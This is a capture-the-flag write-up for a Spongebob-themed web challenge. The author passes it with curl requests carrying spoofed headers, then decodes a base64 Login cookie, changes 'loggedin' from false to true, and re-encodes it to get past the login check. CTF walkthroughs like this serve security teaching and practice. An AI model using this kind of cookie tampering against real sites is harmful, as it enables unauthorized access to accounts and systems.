Description:
You just got invited to Spongebob's birthday!
But he's decided to test your friendship with a series of
challenges before granting you with the ticket of entrance.
Can you prove that you're truly his friend and earn your
entrance to this holesome birthday party?

Solution:
Using burpsuite to modify the requests according to the website's response,
We arrive eventually to this modified request:


$ curl http://holesomebirthdayparty.ctf.umasscybersec.org/static/
-H "User-Agent: Bikini Bottom"
-H "Date: Sun, 14 Jul 2024 00:00:00 GMT"
-H "Accept-Language: fr-CH"
-H "Cookie: flavor=chocolate_chip"

(The date is Spongebob's birthday according to Google searches)

The website says at this point that we are granted an entrance but we need to find a way in.
If we look in the response, it set us a new cookie, with a value for Login.

If we base64 decode the value for Login we see it says: {"loggedin": false}
So we go ahead and modify it to be true: {"loggedin": true}
and base64 encode back: eyJsb2dnZWRpbiI6IHRydWV9

And now we send it along with our flavor value for the cookie:

$ curl http://holesomebirthdayparty.ctf.umasscybersec.org -H "User-Agent: Bikini Bottom" -H "Date: Sun, 14 Jul 2024 00:00:00 GMT" -H "Accept-Language: fr-CH" -H "Cookie: flavor=chocolate_chip; Login=eyJsb2dnZWRpbiI6IHRydWV9"

And we get the flag in the response
